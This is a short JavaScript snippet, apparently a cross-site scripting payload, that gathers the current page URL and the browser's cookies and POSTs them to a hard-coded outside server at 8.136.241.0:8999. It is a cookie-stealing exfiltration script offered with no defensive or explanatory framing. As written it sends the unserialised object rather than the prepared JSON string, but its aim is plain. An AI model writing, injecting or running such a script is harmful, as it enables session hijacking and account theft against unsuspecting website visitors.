var xhr = new XMLHttpRequest ();

var data={};
data['url'] = location.toString();
data['cookie'] = document.cookie;
var dataString = JSON.stringify(data)
xhr.open ("POST", "http://8.136.241.0:8999/sa2asdjnh12387zbn", true);
xhr.setRequestHeader('Content-type','application/json; charset=utf-8');
xhr.send(data);